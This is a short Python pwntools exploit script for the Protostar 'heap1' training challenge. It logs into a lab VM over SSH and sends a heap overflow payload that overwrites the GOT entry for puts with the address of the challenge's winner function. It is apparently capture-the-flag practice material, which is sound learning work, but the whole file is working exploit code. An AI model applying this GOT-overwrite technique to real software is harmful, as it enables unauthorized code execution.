#!/usr/bin/python2
from pwn import *

USER_NAME = 'user'
WINNER_ADDRESS = p32(0x08048494)
PUTS_ADDRESS = p32(0x08049774)
IP_ADDRESS = '192.168.56.102'
FILE_LOCATION = '/opt/protostar/bin/heap1'
PASSWORD = 'user'

def get_payload():
	payload = FILE_LOCATION + " "
	payload += "A"*20
	payload += PUTS_ADDRESS
	payload += " "
	payload += WINNER_ADDRESS
	return payload
	
def main():
	shell = ssh(USER_NAME, IP_ADDRESS, password=PASSWORD)
	sh = shell.run('/bin/sh')
	print(get_payload())
	sh.sendline(get_payload())	
	while True:
		print(sh.recvline())	

if __name__ == "__main__":
	main()

